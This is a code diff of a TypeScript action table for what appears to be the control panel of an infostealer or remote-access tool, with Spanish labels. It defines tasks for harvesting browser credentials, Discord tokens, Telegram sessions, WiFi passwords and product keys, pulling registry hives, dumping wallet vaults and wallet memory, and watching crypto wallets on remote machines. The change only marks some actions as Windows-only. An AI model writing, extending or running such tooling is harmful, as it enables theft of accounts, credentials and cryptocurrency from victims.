@@ -147,8 +147,8 @@ export const ACTIONS: ActionDef[] = [
   { id: 'harvest-browsers', group: 'credenciales', label: 'Navegadores', icon: Globe, task: 'harvest', detail: 'harvest · kind=browsers', bulk: true, resolve: () => task('harvest', { kind: 'browsers' }, 180) },
   { id: 'harvest-discord', group: 'credenciales', label: 'Tokens de Discord', icon: MessageSquare, task: 'harvest', detail: 'harvest · kind=discord', bulk: true, resolve: () => task('harvest', { kind: 'discord' }, 120) },
   { id: 'harvest-telegram', group: 'credenciales', label: 'Sesión de Telegram', icon: MessageSquare, task: 'harvest', detail: 'harvest · kind=telegram', bulk: true, resolve: () => task('harvest', { kind: 'telegram' }, 120) },
-  { id: 'harvest-wifi', group: 'credenciales', label: 'WiFi', icon: Wifi, task: 'harvest', detail: 'harvest · kind=wifi', bulk: true, resolve: () => task('harvest', { kind: 'wifi' }, 120) },
-  { id: 'harvest-productkey', group: 'credenciales', label: 'ProductKey', icon: KeyRound, task: 'harvest', detail: 'harvest · kind=productkey', bulk: true, resolve: () => task('harvest', { kind: 'productkey' }, 120) },
+  { id: 'harvest-wifi', group: 'credenciales', label: 'WiFi', icon: Wifi, task: 'harvest', windowsOnly: true, detail: 'harvest · kind=wifi', bulk: true, resolve: () => task('harvest', { kind: 'wifi' }, 120) },
+  { id: 'harvest-productkey', group: 'credenciales', label: 'ProductKey', icon: KeyRound, task: 'harvest', windowsOnly: true, detail: 'harvest · kind=productkey', bulk: true, resolve: () => task('harvest', { kind: 'productkey' }, 120) },
   { id: 'hives', group: 'credenciales', label: 'Hives del registro', icon: FileText, task: 'agent', detail: 'agent · hives', windowsOnly: true, resolve: () => agent('hives', 180) },
   { id: 'scan', group: 'credenciales', label: 'Escanear wallets', icon: Wallet, task: 'scan_wallets', detail: 'scan_wallets · opciones', dialog: 'scan_wallets', bulk: true, local: true },
   { id: 'dump', group: 'credenciales', label: 'Extraer vault', icon: Archive, task: 'dump_vault', detail: 'dump_vault · {target}', dialog: 'dump_vault', local: true },
@@ -165,7 +165,7 @@ export const ACTIONS: ActionDef[] = [
   { id: 'watch-on', group: 'wallets', label: 'Vigilar wallets', icon: Wallet, task: 'agent', detail: 'agent · wallet watch on', bulk: true, resolve: () => agent('wallet watch on', 60) },
   { id: 'watch-off', group: 'wallets', label: 'Dejar de vigilar', icon: XCircle, task: 'agent', detail: 'agent · wallet watch off', bulk: true, resolve: () => agent('wallet watch off', 60) },
   { id: 'watch-status', group: 'wallets', label: 'Estado de vigilancia', icon: Activity, task: 'agent', detail: 'agent · wallet watch status', resolve: () => agent('wallet watch status', 30) },
-  { id: 'memdump', group: 'wallets', label: 'Volcar memoria', icon: Cpu, task: 'agent', detail: 'agent · memdump <wallet>', dialog: 'agent', local: true },
+  { id: 'memdump', group: 'wallets', label: 'Volcar memoria', icon: Cpu, task: 'agent', windowsOnly: true, detail: 'agent · memdump <wallet>', dialog: 'agent', local: true },
 
   // Ficheros
   { id: 'explore', group: 'ficheros', label: 'Explorar ficheros', icon: Files, local: true },
